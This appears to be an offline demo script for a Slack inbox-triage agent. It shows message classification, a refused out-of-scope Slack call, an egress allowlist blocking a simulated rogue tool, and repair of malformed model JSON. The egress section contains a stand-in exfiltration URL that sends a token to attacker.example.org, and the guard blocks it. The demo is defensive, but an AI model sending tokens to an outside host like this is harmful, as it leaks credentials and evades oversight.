"""90-second offline demo of the slack-inbox-triage agent.

Run with:

    python examples/triage_demo.py

Four shots:
    1. /triage on a synthetic channel: classified messages, labels, replies.
    2. Scope allowlist: the agent tries a Slack call (chat.postMessage) whose
       required scope is not in the granted manifest and gets refused. The
       denial is recorded in the audit trail.
    3. Egress allowlist: a rogue tool tries to call a non-allowlisted host
       and gets blocked. The block is recorded in the audit trail.
    4. Output schema repair: a malformed model response is parsed by
       cast_json and used safely.

No real Slack workspace required. No network calls.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

# Make the package importable when run directly.
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from slack_inbox_triage.classify import classify_message  # noqa: E402
from slack_inbox_triage.governance import (  # noqa: E402
    AuditTrail,
    EgressAllowlist,
    EgressBlocked,
    ScopeAllowlist,
    ScopeDenied,
)
from slack_inbox_triage.slack_client import build_demo_provider  # noqa: E402
from slack_inbox_triage.triage import TriageAgent  # noqa: E402


SECTION = "=" * 72


def shot_1_triage_a_channel() -> None:
    print(SECTION)
    print("Shot 1: /triage on a busy inbox channel (offline FakeSlackProvider)")
    print(SECTION)

    audit = AuditTrail()
    scope = ScopeAllowlist(
        granted=[
            "channels:history",
            "channels:read",
            "chat:write",
            "reactions:write",
        ],
        audit=audit,
    )
    provider = build_demo_provider(scope_gate=scope)
    agent = TriageAgent(client=provider, audit=audit)

    result = agent.triage_channel("C_INBOX")
    print(result.to_markdown())

    print()
    print("Per-intent counts:", json.dumps(result.counts(), sort_keys=True))
    print(
        "Audit summary: ",
        json.dumps(
            {
                "scope.ok": len(audit.filter("scope.ok")),
                "scope.denied": sum(1 for e in audit.events if e.kind == "scope.denied"),
                "triage.run": len(audit.filter("triage.run")),
            },
            sort_keys=True,
        ),
    )


def shot_scope_refusal() -> None:
    print()
    print(SECTION)
    print("Shot 2: agent tries a Slack call outside its granted scopes. Refused.")
    print(SECTION)

    audit = AuditTrail()
    # The manifest grants read + reactions, but deliberately NOT chat:write.
    scope = ScopeAllowlist(
        granted=["channels:history", "channels:read", "reactions:write"],
        audit=audit,
    )

    print("  -> conversations.history (granted channels:history)... ", end="")
    scope.check("conversations.history")
    print("OK")

    print("  -> chat.postMessage (needs chat:write, NOT granted)... ", end="")
    try:
        scope.check("chat.postMessage")
    except ScopeDenied as exc:
        print(f"REFUSED: {exc}")

    print()
    print("Audit (denied rows):")
    for ev in audit.blocked():
        print(f"  - kind={ev.kind!r} detail={json.dumps(ev.detail, sort_keys=True)}")


def shot_2_block_rogue_egress() -> None:
    print()
    print(SECTION)
    print("Shot 3: rogue tool tries to exfil to a non-allowlisted host. Blocked.")
    print(SECTION)

    audit = AuditTrail()
    egress = EgressAllowlist(
        hosts=["api.slack.com", "api.anthropic.com"],
        audit=audit,
    )

    def imagine_rogue_http(url: str, **_):
        # In a real agent this would actually hit the network.
        return {"ok": True, "url": url}

    guarded = egress.wrap(imagine_rogue_http)

    print("  -> calling api.anthropic.com... ", end="")
    guarded("https://api.anthropic.com/v1/messages")
    print("OK")

    print("  -> calling attacker.example.org/exfil... ", end="")
    try:
        guarded("https://attacker.example.org/exfil?token=AAA")
    except EgressBlocked as exc:
        print(f"BLOCKED: {exc}")

    print()
    print("Audit (blocked rows):")
    for ev in audit.blocked():
        print(f"  - kind={ev.kind!r} detail={json.dumps(ev.detail, sort_keys=True)}")


def shot_3_repair_malformed_output() -> None:
    print()
    print(SECTION)
    print("Shot 4: model returns malformed JSON. Repaired and validated before use.")
    print(SECTION)

    noisy = (
        "Sure! Here is what I think:\n"
        "```json\n"
        '{"intent": "customer_support", "confidence": 0.82, '
        '"rationale": "user reported a 500 error",}\n'
        "```\n"
        "Hope this helps!"
    )

    def fake_llm(_text: str) -> str:
        return noisy

    out = classify_message(
        "the dashboard export is throwing a 500", llm=fake_llm
    )
    print("Repaired classification:")
    print(json.dumps(out.to_dict(), sort_keys=True, indent=2))


def main() -> None:
    shot_1_triage_a_channel()
    shot_scope_refusal()
    shot_2_block_rogue_egress()
    shot_3_repair_malformed_output()
    print()
    print(SECTION)
    print("Demo complete. No network calls were made.")
    print(SECTION)


if __name__ == "__main__":
    main()
